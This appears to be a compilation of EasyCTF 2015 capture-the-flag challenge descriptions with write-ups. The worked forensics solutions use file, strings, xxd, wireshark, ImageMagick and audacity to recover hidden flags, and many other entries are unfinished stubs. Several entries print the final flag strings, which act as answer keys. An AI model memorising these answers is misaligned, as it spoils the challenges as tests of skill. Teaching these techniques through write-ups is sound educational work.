
**Category:** Cryptography
**Points:** 150
**Solves:** 
**Description:**

> This string has been encrypted using XOR!
> 
> 
> `message = " $6<&1#><*\x1a!$2\x22\x1a,\x1a- $7!\x1a<*0\x1a),. !\x1a=*78"`
> 
> 
> Hint: What could the key be? Here's a hint: it was encrypted 3 times.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/xor_150.md>
# EasyCTF 2015: Yve's Fave Pic (275)

**Category:** Cryptography
**Points:** 275
**Solves:** 
**Description:**

> @chaosagent doesn't like people seeing pictures of his face. So naturally, here's a [picture](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/smile.jpg) of his face. Have fun :)
> 
> 
> Hint: Note: This is a VERY rare occurrence. @chaosagent NEVER smiles. Make note of it. Oh, wait, you wanted a hint? Fine. You need some programming to solve this efficiently.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/yves_fave_pic_275.md>
# EasyCTF 2015: Zob's Password (450)

**Category:** Cryptography
**Points:** 450
**Solves:** 
**Description:**

> Zob is sending his friends a password to one of his game accounts so that they can play for him. However he was using one of the organization's computers which aren't for personal use. Teach Zob a lesson by breaking his encrypted [password](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/zobs_password.txt).
> 
> 
> Hint: Zob makes short passwords

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/zobs_password_450.md>
# EasyCTF 2015: 49 Shades of Gray (125)

**Category:** Forensics
**Points:** 125
**Solves:** 
**Description:**

> We only have 49 shades of gray D:
> 
> 
> \#000000 to \#F5F5F5... there's one shade missing! Find the hex value of the missing shade. Pound sign optional.
> 
> 
> [Image](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/shades.png)
> 
> 
> Hint: How can we tell which color is which?


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeup links:

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/49_shades_of_gray_125.md>

We are given a picture:

![](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/shades.png)

The description and name of this task suggests that there are only 49 types of rgb values that form a gray shade and that we have to find the missing shade.

We run [this python script](pixels.py) on the image to get all pixel values and sort the unique occurrences of the pixel values numerically to get all used rgb values:

```bash
$ python2.7 ~/scripts/pixels.py shades.png  | sort -nu 
0 0 0
5 5 5
10 10 10
15 15 15
20 20 20
25 25 25
30 30 30
35 35 35
40 40 40
45 45 45
50 50 50
55 55 55
60 60 60
65 65 65
70 70 70
75 75 75
85 85 85
90 90 90
95 95 95
100 100 100
105 105 105
110 110 110
115 115 115
120 120 120
125 125 125
130 130 130
135 135 135
140 140 140
145 145 145
150 150 150
155 155 155
160 160 160
165 165 165
170 170 170
175 175 175
180 180 180
185 185 185
190 190 190
195 195 195
200 200 200
205 205 205
210 210 210
215 215 215
220 220 220
225 225 225
230 230 230
235 235 235
240 240 240
245 245 245
$ python2.7 ~/scripts/pixels.py shades.png  | sort -nu  | wc
      49     147     525
```

Using `wc`, we indeed see only 49 lines, meaning 49 used rgb values that form a specific gray.

We find the missing combination: `80 80 80` or in hex `50 50 50`.

The final flag is `505050`

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/49_shades_of_gray_125.md>
# EasyCTF 2015: A Picture is Worth a Thousand Words (100)

**Category:** Forensics
**Points:** 100
**Solves:** 
**Description:**

> A picture is worth a thousand words. Can you find the (JPEG) picture among a thousand files? Connect to the EasyCTF SSH server and find the files in `/problems/1000words`. The files are also available for download [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/data.zip).
> 
> 
> Hint: Grep is always your friend.


## Write-up

by [polym](https://github.com/abpolym)

We are given a zip containing several files with random names such as `yVtcAVSqX31NBNEf` or `xFchwoeIko36ZmTU`.

The first thing to do is call the `file` command on each to find out what kind of files we are dealing with:

```bash
$ file *
file * | head
02EGypzE5VkCbZB9: ASCII text, with very long lines
06cL1JpILiS48QoA: ASCII text, with very long lines
086lVtmY2jzPJbTi: ASCII text, with very long lines
08Du4VJdtpvC6MZy: ASCII text, with very long lines
[...]
zb0VNgbT8MrEZxXl: ASCII text, with very long lines
zbUrg2VOULBucFVg: ASCII text, with very long lines
zmPUxLoUMH9N2GdY: ASCII text, with very long lines
zmgiDg4NhouKpbDV: ASCII text, with very long lines
```

A lot of ASCII files containing random ASCII characters.

Maybe there are other files except ASCII only files?

```bash
$ file * | awk '{print $2}' | sort | uniq -c | sort -n
   1 Arhangel
   1 Bio-Rad
   1 Clarion
   1 JPEG
   1 Microsoft
   2 MGR
   4 Netpbm
 989 ASCII
```

We see a JPEG, lets `grep` for it!

```bash
$ file * | grep 'JPEG'
UgeVjTlmZjNFvULk: JPEG image data, JFIF standard 1.01
```

The flag, `easyctf{it_must_be_pretty_hard_reading_this}`, is inside the picture:

![](./UgeVjTlmZjNFvULk)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/a_picture_is_worth_a_thousand_words_100.md>
# EasyCTF 2015: Accelerator (300)

**Category:** Forensics
**Points:** 300
**Solves:** 
**Description:**

> Hey, do you want to learn more about Steganography? Cool, read [this](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/steg.pdf) article. Just friendly learning. We're not hiding ANYTHING \*nervous laugh\*
> 
> 
> Hint: Yeah chaosagent likes Accelerator blah blah blah


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/accelerator_300.md>
# EasyCTF 2015: An apple a day keeps the dinosaur away? (35)

**Category:** Forensics
**Points:** 35
**Solves:** 
**Description:**

> Oh look, it's a perfectly innocent picture of an [apple](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/apple.jpg). Nothing to see here!
> 
> 
> Hint: Apples are suspicious. Don't trust apples. They always have something to hide . . .


## Write-up

by [polym](https://github.com/abpolym)

We are given a picture of an apple:

![](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/apple.jpg)

Applying `strings` on the file in combination with a `grep` for `easyctf` yields the flag:

```bash
$ strings -a apple.jpg | grep 'easyctf'
   the flag is easyctf{w0w_much_appl3s}
```

The flag is `easyctf{w0w_much_appl3s}`.

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/an_apple_a_day_keeps_the_dinosaur_away_35.md>
# EasyCTF 2015: Corrupted (375)

**Category:** Forensics
**Points:** 375
**Solves:** 
**Description:**

> I'm not an anime person, but I have weeaboo friends. One of them uses [this](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/yuno.jpg) as her profile pic. Unfortunately, she sent me a corrupted version. Can you find out what she's hiding?
> 
> 
> Hint: Who is Yuno Gasai? From what I hear, she's a scary yandere.
> 
> Hint: On a more serious note, stop trying to fix the image. It's not broken -- it's hiding stuff.

## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on following write-ups:

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/corrupted_375.md>

We are given an image of Yuno Gasai:

![](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/yuno.jpg)

It seems to be broken, but the hints tell us that it is not broken, but hiding stuff - most likely it changed bits in the original image.

So we try to find the original image that this modified one is based on.

This can be done by following these steps:

* Search for "Yuno Gasai" on <https://images.google.de/>
* Set the search options to only display pictures the same resolution as the modified version (`130`x`130`)
* Download the first non-broken image that represents the modified version
* Upload the non-broken image on <https://images.google.de/> to find similar images
* Select all resolutions to see only similar versions of this non-broken image
* Again, set the resolution option
* Get around 16 `130`x`130` versions of the non-broken image

The full image list is [here](yuno.list).

Then, we download all versions and have a look at their size in bytes:

```bash
$ ls -l yuno.jpg 
-rw-r--r--@ 1 xxx  xxx  6851 Jan  1 17:15 yuno.jpg
$ cd yunos/
$ ls -lS
total 264
-rw-r--r--@ 1 xxx  xxx  11211 Jan  4 09:05 10376136_803663996379870_881095011285469366_n.jpg
-rw-r--r--  1 xxx  xxx   6944 Jan  4 09:05 srS9LECHDAQ.jpg
-rw-r--r--  1 xxx  xxx   6943 Jan  4 09:05 72IAXH3Uf5M.jpg
-rw-r--r--  1 xxx  xxx   6932 Jan  4 09:07 tiUPEUczHYY.jpg
-rw-r--r--  1 xxx  xxx   6932 Jan  4 09:06 w_A8FR5avZc.jpg
-rw-r--r--  1 xxx  xxx   6931 Jan  4 09:07 0OcpdtbgLqY.jpg
-rw-r--r--  1 xxx  xxx   6897 Jan  4 09:06 nj8xr2wl0TM.jpg
-rw-r--r--  1 xxx  xxx   6893 Jan  4 09:06 jPpfSGtlCxY.jpg
-rw-r--r--  1 xxx  xxx   6892 Jan  4 09:05 VrRG4olxM9Y.jpg
-rw-r--r--  1 xxx  xxx   6878 Jan  4 09:06 QJlbvqtQgMQ.jpg
-rw-r--r--  1 xxx  xxx   6855 Jan  4 09:06 _A7qy52f8Vw.jpg
-rw-r--r--  1 xxx  xxx   6853 Jan  4 09:05 LYHxH-8DBsE.jpg
-rw-r--r--  1 xxx  xxx   6853 Jan  4 09:06 qkimpnfZfqM.jpg
-rw-r--r--  1 xxx  xxx   6851 Jan  4 09:06 5WzbbhtpMkQ.jpg
-rw-r--r--  1 xxx  xxx   6845 Jan  4 09:05 -nw21lTOJDA.jpg
-rw-r--r--  1 xxx  xxx   6234 Jan  4 09:06 10931434_890605537650928_5977686544027780096_n.jpg
```

Out of the downloaded versions only one, `5WzbbhtpMkQ.jpg`, has the same size (`6851`) as the corrupted version:

![](./5WzbbhtpMkQ.jpg)

We print out their differences first with `xxd` to see that a stream of bytes has been modified:

```bash
$ diff <(xxd yuno.jpg) <(xxd yunos/5WzbbhtpMkQ.jpg)
274,288c274,288
< 0001110: 7c45 9f9b 0f0e 362d df47 a5a6 ef37 110d  |E....6-.G...7..
< 0001120: c688 ee49 7724 fb10 d7b8 9fba 5faa de88  ...Iw$......_...
< 0001130: 8661 fb29 2d25 d74a 055d fadd 0461 445f  .a.)-%.J.]...aD_
< 0001140: 7e44 a03f 87c9 eb01 bda4 ad52 0f94 5344  ~D.?.......R..SD
< 0001150: da82 7335 42dc 2e31 dd68 ada6 b794 f469  ..s5B..1.h.....i
< 0001160: a10a 4d5c 61cb 4482 ce48 8262 34e9 011f  ..M\a.D..H.b4...
< 0001170: 1ae7 254b 7e3d 72cb 4039 5f62 e83c 3ef3  ..%K~=r.@9_b.<>.
< 0001180: 9f97 820b 0bd9 e276 263b b434 9a0b bcca  .......v&;.4....
< 0001190: 1e18 0d4f 913d c41f 39f5 d45c 8fcd e014  ...O.=..9..\....
< 00011a0: 16c8 4d9c e447 3ab8 cb73 5f8a 741a 331d  ..M..G:..s_.t.3.
< 00011b0: dc78 ae0b d9f5 929a 5165 f961 0f5e 999d  .x......Qe.a.^..
< 00011c0: 33ba 3a27 f8ec 6871 8f18 5c29 979f 1b8b  3.:'..hq..\)....
< 00011d0: eac9 9e80 1db1 4dad 83ef 5f9a faa2 67e4  ......M..._...g.
< 00011e0: 4abb 3ba9 8208 5dd4 e43c 0ef5 61d9 7c7f  J.;...]..<..a.|.
< 00011f0: e20c 7dd2 ff47 9a46 18f8 7e20 7e79 d624  ..}..G.F..~ ~y.$
---
> 0001110: 7c44 9e9b 0f0d 362c df46 a4a6 ef37 110c  |D....6,.F...7..
> 0001120: c687 ed48 7724 fa0f d7b7 9eb9 5eaa de87  ...Hw$......^...
> 0001130: 8660 fa29 2d25 d649 055c f9dc 0460 445f  .`.)-%.I.\...`D_
> 0001140: 7e43 9f3f 87c8 ea01 bda3 ac51 0e94 5243  ~C.?.......Q..RC
> 0001150: da81 7234 41dc 2e30 dd67 aca5 b793 f468  ..r4A..0.g.....h
> 0001160: a109 4c5c 60ca 4382 ce47 8162 33e8 001e  ..L\`.C..G.b3...
> 0001170: 1ae6 244b 7d3c 71ca 4039 5e61 e83c 3ef3  ..$K}<q.@9^a.<>.
> 0001180: 9f96 810b 0ad8 e175 263a b334 990a bbc9  .......u&:.4....
> 0001190: 1e17 0c4f 903c c31e 39f4 d35c 8ecc df13  ...O.<..9..\....
> 00011a0: 16c7 4c9c e346 39b7 cb72 5e8a 7319 321c  ..L..F9..r^.s.2.
> 00011b0: dc77 ad0b d8f4 9199 5164 f861 0e5d 989c  .w......Qd.a.]..
> 00011c0: 33b9 3927 f7eb 6770 8f17 5b29 969e 1a8a  3.9'..gp..[)....
> 00011d0: eac8 9d80 1cb0 4cac 83ee 5e9a f9a1 66e3  ......L...^...f.
> 00011e0: 4abb 3aa8 8208 5dd4 e43b 0df5 60d8 7b7e  J.:...]..;..`.{~
> 00011f0: e20b 7cd1 fe46 9a45 18f8 7e20 7e79 d624  ..|..F.E..~ ~y.$
```

We print out their differences using [this python script](bytediff.py):

```bash
$ python2.7 bytediff.py yuno.jpg 5WzbbhtpMkQ.jpg 
0000[...]0000
0110010101100001011100110111100101100011011101000110011001111011011110010111010101101110011011110110111100110000011011110110111101101111011011110110111101101111011011110110111101101111011011110110111101101111001100000110111101111101
0000[...]0000
```

Converting the resulting binary string to ASCII, we get the flag, `easyctf{yunoo0oooooooooooo0o}`:

```bash
$ echo "0110010101100001011100110111100101100011011101000110011001111011011110010111010101101110011011110110111100110000011011110110111101101111011011110110111101101111011011110110111101101111011011110110111101101111001100000110111101111101" | perl -lpe '$_=pack"B*",$_'
easyctf{yunoo0oooooooooooo0o}
```

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/corrupted_375.md>
# EasyCTF 2015: iSpy (120)

**Category:** Forensics
**Points:** 120
**Solves:** 
**Description:**

> We intercepted some suspicious network activity. We think that the enemy has been exchanging important data. Can you help us figure out what it is? You can find a copy of the file [here](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/ispy.pcapng).
> 
> 
> Hint: You're going to need to be able to open that file. Something like [Wireshark](https://www.wireshark.org) might help.


## Write-up

by [polym](https://github.com/abpolym)

We get a pcap traffic dump that we analyze using `wireshark` to see several HTTP and TCP packets.

First, we have a look at the TCP stream `Analyze->Follow->TCP Stream`:

![](./tcp-stream.png)

Looks like some pictures (see the `.PNG` in the content and `Content-Type` in the request headers) have been uploaded.

Therefore, we then export all objects transmitted (`File->Export Objects->HTTP->Save all`):

![](./export-objects.png)

One of these pictures yields the flag, `{pcap_fun!??}`:

![](Drawing.jpg)



## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/ispy_120.md>
# EasyCTF 2015: Liar (50)

**Category:** Forensics
**Points:** 
**Solves:** 
**Description:**

> I may or may not have illegally bought this [file](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/secret) from someone who claims that it contains secret pictures of my friend and her fiancé. Unfortunately, I can't open it, and I already paid $4096 for it. Can you help me find out if the seller was lying?
> 
> 
> Hint: I feel like something is missing ...


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/liar_50.md>

First, we determine what the given file named `secret` is all about:

```bash
$ file secret
secret: Zip archive data, at least v2.0 to extract
```

`secret` is a zip archive, which we extract using `7z` to get a file named `secret.png`:

```bash
$ 7z x secret -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: secret

Extracting  secret.png
Extracting  __MACOSX
Extracting  __MACOSX/._secret.png

Everything is Ok

Folders: 1
Files: 2
Size:       22141902
Compressed: 2223574
$ cd out
$ file secret.png
secret.png: data
```

Though the file name implies a PNG, `file` tells otherwise.

Therefore, we open `secret.png` using a hexedit, e.g. `hexedit`:

![](./hexedit.png)

We can see the PNG typical CHUNK named `IHDR`, which implies that this file is indeed a PNG.

Why does `file` tells us otherwise? Well `file` works by looking at [file signatures](http://www.garykessler.net/library/file_sigs.html), which mostly consist of the start of a file, namely the `header`, and the end of a file - the `footer`.

PNGs always begin with the hexadecimal characters `89 50 4E 47 0D 0A 1A 0A` and if `file` sees these bytes in this order, it assumes a PNG.

In our case, however, the first 4 bytes are missing: `89 50 4E 47`.

We can fix that using `xxd`:

```bash
$ echo '89504e47' > secret.xxd 
$ xxd -p secret.png >> secret.xxd
$ xxd -r -p secret.xxd > fixed.png
$ md5 fixed.png 
71cfff64865db14a0868a5b48a2e23c8  fixed.png
$ file fixed.png
fixed.png: PNG image data, 2631 x 2800, 8-bit/color RGB, non-interlaced
$ pngcrush -ow fixed.png # to make the resulting png smaller - just for this repo 21 MB vs 1.7MB
```

`file` now tells us that `fixed.png` is indeed a PNG.

The fixed PNG now displays the flag, `easyctf{troll3d}`:

![](./fixed.png)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/liar_50.md>
# EasyCTF 2015: lolteam (65)

**Category:** Forensics
**Points:** 65
**Solves:** 
**Description:**

> There's a suspicious team out there called **lolteam**, I got my eyes on them for a while and I managed to [wiretap](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/lolteam.pcapng) their browser as they were changing their password. What did they change their password to?
> 
> 
> Hint: Don't know how to open [.pcapng](http://fileinfo.com/extension/pcapng) files?

## Write-up

by [polym](https://github.com/abpolym)

We are given a pcap traffic dump that we open with `wireshark` to see some HTTP and TCP packets.

By following the TCP stream (`Analyze->Follow->TCP Stream`), we see that the traffic captured a HTTP POST request to `2014.easyctf.com/api/account/update`.

It contains teamname, school name, password and password confirmation entries - the password contains the flag, `flag{no,_lolteam_is_not_an_admin_account}`:

![](./wireshark.png)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/lolteam_65.md>
# EasyCTF 2015: Pixels (180)

**Category:** Forensics
**Points:** 180
**Solves:** 
**Description:**

> [mystery1](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/mystery1.png) - [mystery2](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/mystery2.png)
> 
> 
> Hint: Did you know you can do math on images?


## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on following write-ups:

* <https://github.com/DavidJacobson/EasyCTF-2015-writeup/blob/master/crypto.md#pixels---180-pts>

We are given two pictures:

![](https://raw.githubusercontent.com/EasyCTF/easyctf-2015-writeups/master/files/mystery1.png)
![](https://raw.githubusercontent.com/EasyCTF/easyctf-2015-writeups/master/files/mystery2.png)

The hint tells us to do math on the pictures, meaning that we have to subtract, add, multiply or do other operations with the pixel values of both pictures.

We can do that using [ImageMagicks `compose`](http://www.imagemagick.org/Usage/compose/) command with its different [mathematical operators](http://www.imagemagick.org/Usage/compose/#math).

Turns out, we need to use the `difference` operator:

```bash
$ convert mystery1.png mystery2.png -compose difference -composite -colorspace Gray new.png 
```

`new.png`:

![](./new.png)

The flag is `easyctf{PRETTY_PIXEL_MATH}`.

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/pixels_180.md>
# EasyCTF 2015: Repetitive Strain Injury (475)

**Category:** Forensics
**Points:** 475
**Solves:** 
**Description:**

> Help! I started playing this game called osu! and it's really fun. Now I have RSI :( but you won't believe how much [pp](https://osu.ppy.sh/wiki/Performance_Points) I got for this play: [amazing replay](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/ken_u_read_this)
> 
> 
> Hint: No, it's not `.osr`. Also, you can have some imaginary points if you tell me what mouse I'm using.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/repetitive_strain_injury_475.md>
# EasyCTF 2015: Rest in Pepperoni-Pizzas (100)

**Category:** Forensics
**Points:** 100
**Solves:** 
**Description:**

> I gave my little sister a flag, but she cut it up and hid the pieces! Retrieve it here: [ripinpizzas.pdf](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/ripinpizzas.pdf).
> 
> 
> Hint: Have fun! If you do it by the paper-and-scissors method, share it to [@easyctf](http://twitter.com/easyctf) !


## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on following write-ups:

* <https://github.com/ztaylor54/CTF/blob/master/EasyCTF%202015/pepperoni_pizza.md>
* <https://github.com/Cholle13/CTF/blob/master/rest_in_pepperoni-pizzas.md>

We are given a PDF:

![](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/ripinpizzas.pdf)

We see a picture hidden behind the "Nothing to see here" layer and use `foremost` to extract the picture:

```bash
$ foremost ripinpizzas.pdf
Processing: ripinpizzas.pdf
|*|
$ tree output
output/
├── audit.txt
├── jpg
│   └── 00000001.jpg
└── pdf
    └── 00000000.pdf

2 directories, 3 files
```

The picture is a puzzle that we have to solve to get the flag:

![](./00000001.jpg)

The solved puzzle spells the flag, `easyctf{can_y0u_put_411_the_pieces_2gether?}`:

![](https://raw.githubusercontent.com/ztaylor54/CTF/master/EasyCTF%202015/together.jpg)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/rest_in_pepperoni-pizzas_100.md>
# EasyCTF 2015: sayonara (325)

**Category:** Forensics
**Points:** 325
**Solves:** 
**Description:**

> Found some interesting words of advice left by `sayonara-bye`... help me understand it!
> 
> 
> [sayonara.mp3](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/sayonara.mp3)
> 
> 
> MD5: 9f44501f0ac360c3255548c96b70aecb
> 
> 
> Hint: Why does that right channel sound strange?

## Write-up

by [polym](https://github.com/abpolym)

This writeup is loosely based on following write-ups:

* <https://github.com/C2TF/writeups/tree/master/2015/easyctf/sayonara>
* <https://github.com/1lastBr3ath/EasyCTF-2015-Writeup/blob/master/forensics.md>

Listening closely to the given mp3, we hear a voice talking.

However, as the hint suggests, the voice is not hearable since the right channel produces a loud and disturbing/strange sound.

We open the mp3 in `audacity` (`File->Import->Audio`) and see the two channels of this mp3:

![](./audacity-channels.png)

We can split the channels (`Black Triange -> Split Stereo Track`) and mute the right channel to hear a voice talking:

![](./audacity-split-track.png)

![](./audacity-right-muted.png)

However, the voice is a red herring and does not give us the flag.

The flag actually is hidden in the spectrogram of the right channel!

We can see that easily by switching from the Waveform View to the Spectrogram View in Audacity (`Black Triangle -> Spectrogram`) and setting the sample rate to a smaller/slower number `4000` (`Black Triangle -> Set Rate -> Other`) to see the flag, `easyctf{do_a_frustration}`:

![](./audacity-spectrogram.png)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/sayonara_325.md>
# EasyCTF 2015: Who is this god? (175)

**Category:** Forensics
**Points:** 175
**Solves:** 
**Description:**

> My friend Mich uses this nice [tulip](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/tulip.png) as her profile pic because she likes historical stuff. Did I mention that one of the EasyCTF developers worships her as a god?
> 
> 
> Hint: A tulip a day keeps the economy away :)
> 
> Hint: P.S. Everything you need is in the image...although you might need sharper vision.

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture of a tulip:

![](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/tulip.png)

The hint tells us to sharpen the picture, which we can do using [ImageMagicks `sharpen` tool](http://www.imagemagick.org/Usage/blur/#sharpen):

```bash
$ convert tulip.png -sharpen 0x10 sharp_tulip.png
```

![](sharp_tulip.png)

We see a slight highlighted text in the upper left corner that spells out the flag, `easyctf{all_hail_michy}`, which can be highlighted a bit more using a random color map by `stegsolve`:

![](./random-color-tulip.png)

According to [this writeup](https://github.com/1lastBr3ath/EasyCTF-2015-Writeup/blob/master/forensics.md), we can use [this forensic tool](https://29a.ch/photo-forensics/#forensic-magnifier) to see a better contrast without sharpening the image.

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/who_is_this_god_175.md>
# EasyCTF 2015: Hijacked! (100)

**Category:** Linux
**Points:** 
**Solves:** 
**Description:**

> Someone planted a file on our computer (the [shell server](https://www.easyctf.com/shell)), but we don't know what it is! The only clue that we have is that it's owned by a user called `l33t_haxx0r`. Can you figure out the flag?
> 
> 
> Hint: Try to look up useful Linux commands.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/hijacked_100.md>
# EasyCTF 2015: Mrrow????? (75)

**Category:** Linux
**Points:** 75
**Solves:** 
**Description:**

> A lonely little text file wants to play a game: `/problems/owner`.
> 
> 
> Hint: Google is always your friend.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/mrrow_75.md>
# EasyCTF 2015: Now You See Me, Now You Don't (75)

**Category:** Linux
**Points:** 75
**Solves:** 
**Description:**

> Now you see me, now you don't? There's a file in `/problems/elusive`, but I can't seem to find it. Find it and print its contents!
> 
> 
> Hint: What are `hidden files` in Linux?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/now_you_see_me%2C_now_you_dont_75.md>
# EasyCTF 2015: Same Difference (125)

**Category:** Linux
**Points:** 125
**Solves:** 
**Description:**

> *Solve this problem by connecting to the EasyCTF shell, either in your browser or through some other TTY.*
> 
> 
> We've noticed that a list of passwords has been modified. Compare the original `master_copy.txt` to the `suspicious.txt` and tell us what the password was changed to! The files are on the shell server at `/problems/same_difference`.
> 
> 
> This can be solved only with the tools available in the shell. No scripting languages are required.
> 
> 
> Hint: There's a pretty cool Linux command called `diff` that might be useful for you.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/same_difference_125.md>
# EasyCTF 2015: San Francisco Symphony (75)

**Category:** Linux
**Points:** 75
**Solves:** 
**Description:**

> Who knew musicians could program? They put a flag inside `/problems/sfs/sfs`! But when I run the program, it's not printing out the flag. Find the flag!
> 
> 
> Hint: Darn. That `c` file isn't going to help much either. How can we find the flag using only the binary?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/san_francisco_symphony_75.md>
# EasyCTF 2015: Launch Code (650)

**Category:** Master-Challenge
**Points:** 650
**Solves:** 
**Description:**

> Recently the NSA has intercepted a program which generates the launch codes for Chinese nuclear weapons.
> 
> 
> The launch code generator program takes in a password which is at most 63 characters, and the NSA has also intercepted a password belonging to an agent identified as 'Agent 23102'. Unfortunately, each launch code generator program is locked to a specific agent id, and each agent has a unique password. The program generates the correct launch code based on a combination of the agent id watermarked to the program and the correct password.
> 
> 
> Our intel suggests that the program we have intercepted belongs to an agent with the id 5068, and the password we have intercepted belongs to an agent with the id of 23102.
> 
> 
> **Your task:**
> 
> Reverse engineer the launch code generator program, and modify it so that it will work with agent 23102's password instead of agent 5068. Then, using the intercepted password, generate a valid launch code and report it back to us!
> 
> 
> **Intercepted Program:** [LaunchCode.exe](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/LaunchCode.exe)
> 
> 
> <small>MD5: bd1f54a4fa1f19168303275d6d02ca0f</small>
> 
> 
> **Agent 23102&#39;s Passcode:** diguo zhuyi hai cunzai
> 
> 
> Hint: it's not Feynman.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/master_challenge.md>
# EasyCTF 2015: Survey (15)

**Category:** Miscellaneous
**Points:** 15
**Solves:** 
**Description:**

> Congrats for making it this far! We've got a [survey](http://goo.gl/forms/aXbKvHlYJN) for you, that's worth free points! Please try to get all the members of your team to fill it out, but only submit it once :) Thanks for playing EasyCTF!
> 
> 
> Note: although this counts for points, it will not affect the time of your submissions. You won't be able to pass another team just by solving the survey before them.
> 
> 
> Hint: Don't worry, there's no strings attached!

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/survey_15.md>
# EasyCTF 2015: Can You Even??? (40)

**Category:** Programming
**Points:** 40
**Solves:** 
**Description:**

> Use the programming interface to complete this task. You&#39;ll be given a list of numbers.
> 
> 
> Input: A list of numbers, separated by commas.
> 
> 
> Output: The number of even numbers.
> 
> 
> Read the input from a file called&nbsp;`can-you-even.in`&nbsp;that&#39;s in the current working directory, and then write your output to a file called&nbsp;`can-you-even.out`.
> 
> 
> Hint: If you need help, try looking at the Python Tutorial in the Learn section! Perhaps you should try looking into the modulo (%) operator. 


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/can_you_even_40.md>
# EasyCTF 2015: Coordinates (150)

**Category:** Programming
**Points:** 150
**Solves:** 
**Description:**

> We found this [text](https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/files/qr.txt) lying around, but apparently it doesn't do anything. Want to give it a shot?
> 
> 
> Hint: Do you like painting?


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/coordinates_150.md>
# EasyCTF 2015: EasyCTF Day (55)

**Category:** Programming
**Points:** 55
**Solves:** 
**Description:**

> EasyCTF started on November 3rd, 2015 this year. Find the position where the numerical representation of the month and day of this date `1103` is first found within pi. Use any language you'd like! The flag is the position of the first digit of the date within pi, where 3 is the first digit and the decimal point `.` is not considered a position.
> 
> 
> Hint: First you have to find a way to generate some digits of pi.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/EasyCTF/easyctf-2015-writeups/blob/master/easyctf_day_55.md>
# EasyCTF 2015: Faster Math (325)

**Category:** Programming
**Points:** 325
**Solves:** 
**Description:**

> I need help on my homework! Connect to `programming.easyctf.com:10300` where a series of 100 problems await you.
> 
> 
> Hint: There's only 4 types of problems. You can do it :) If you're having difficulty with the time limit, try running it on the shell server. Its internet should be pretty fast.
> 
> Hint: If you'd like, post your favorite, wackiest autogenerated problems to [@easyctf](http://twitter.com/easyctf)!


## Write-up

(TODO)

## Other write-ups and resources

